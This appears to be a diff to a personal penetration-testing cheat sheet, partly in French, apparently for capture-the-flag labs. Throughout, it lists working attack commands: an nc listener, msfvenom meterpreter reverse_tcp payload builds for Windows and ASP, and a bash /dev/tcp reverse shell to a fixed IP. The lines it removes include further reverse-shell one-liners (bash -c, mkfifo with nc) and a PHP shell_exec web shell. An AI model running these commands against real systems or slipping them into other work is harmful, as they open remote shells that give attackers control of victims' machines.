@@ -13,10 +13,6 @@ rlwrap nc -lvnp 1234
 ## msfvenom
 ### meterpreter
 `msf6 > use exploit/multi/handler `
-Linux exécutable et connectable (elf)  
-```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
-```  
 Windows  
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
@@ -29,24 +25,14 @@ ASP
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
 ```  
-Python 
-```
-msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
-```
 ## _reverse shell from the remote server_
 ```
 bash -i >& /dev/tcp/10.10.16.49/1234 0>&1
 ```
-```
-bash -c 'bash -i >& /dev/tcp/@IP/1234 0>&1'
-``` 
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.16.108 1234 >/tmp/f
-```
 
 ## web shell
 ```
-<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+
 ```
 ### can encode payload in Base64 
 	marche pour les formulaire
